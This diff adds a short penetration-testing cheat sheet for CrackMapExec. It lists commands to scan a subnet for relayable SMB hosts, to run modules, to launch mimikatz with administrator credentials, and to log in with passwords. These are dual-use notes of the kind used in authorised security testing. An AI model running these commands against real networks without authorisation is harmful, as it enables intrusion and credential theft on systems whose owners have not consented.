@@ -1,0 +1,22 @@
+
+https://github.com/byt3bl33d3r/CrackMapExec/wiki
+
+# Obtencion de dispositivos con veriones vulnerables de smb
+cme smb <IPs> --gen-relay-list targets.txt
+
+# General use
+cme <protocol> <target(s)> -M <module name>
+
+# View Module Options
+cme <protocol> -M <module name> --options
+
+# Obtain vulnerable hsots
+sudo cme smb 192.168.200.0/24 --gen-relay-list targets.txt
+
+# Use module options example with mimikaz
+cme <protocol> <target(s)> -u Administrator -p 'P@ssw0rd' -M mimikatz -o COMMAND='privilege::debug'
+
+# Use credencial login
+crackmapexec <protocol> <target(s)> -u username -p password
+crackmapexec <protocol> <target(s)> -u username -p 'Admin!123@'
+crackmapexec <protocol> <target(s)> -u='-username' -p='-Admin!123@'
